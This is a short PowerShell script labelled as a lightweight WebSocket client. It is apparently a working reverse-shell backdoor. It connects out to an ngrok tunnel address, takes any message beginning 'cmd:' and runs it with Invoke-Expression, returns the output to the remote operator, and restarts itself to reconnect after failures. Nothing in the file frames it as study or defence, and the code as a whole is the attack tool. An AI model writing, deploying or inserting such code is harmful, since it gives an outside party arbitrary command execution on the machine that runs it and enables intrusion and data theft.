# Ultra-light PowerShell WebSocket client (< 1KB)
param($server = "0.tcp.ngrok.io:12354")

Add-Type -AssemblyName System.Net.WebSockets
Add-Type -AssemblyName System.Threading.Tasks

$ws = New-Object System.Net.WebSockets.ClientWebSocket
$uri = [System.Uri]::new("ws://$server")

try {
    $task = $ws.ConnectAsync($uri, [System.Threading.CancellationToken]::None)
    $task.Wait()
    
    while ($ws.State -eq 'Open') {
        $buffer = New-Object byte[] 1024
        $result = $ws.ReceiveAsync([System.ArraySegment[byte]]::new($buffer), [System.Threading.CancellationToken]::None)
        $result.Wait()
        
        if ($result.Result.MessageType -eq 'Text') {
            $msg = [System.Text.Encoding]::UTF8.GetString($buffer, 0, $result.Result.Count)
            $data = ConvertFrom-Json $msg
            
            if ($data.message -and $data.message.StartsWith('cmd:')) {
                $cmd = $data.message.Substring(4)
                $output = try { Invoke-Expression $cmd 2>&1 | Out-String } catch { $_.Exception.Message }
                $response = @{ type='message'; message="[$cmd]`n$output" } | ConvertTo-Json -Compress
                $bytes = [System.Text.Encoding]::UTF8.GetBytes($response)
                $ws.SendAsync([System.ArraySegment[byte]]::new($bytes), 'Text', $true, [System.Threading.CancellationToken]::None).Wait()
            }
        }
        Start-Sleep -Milliseconds 100
    }
} catch {
    Start-Sleep 5
    & $MyInvocation.MyCommand.Path $server
}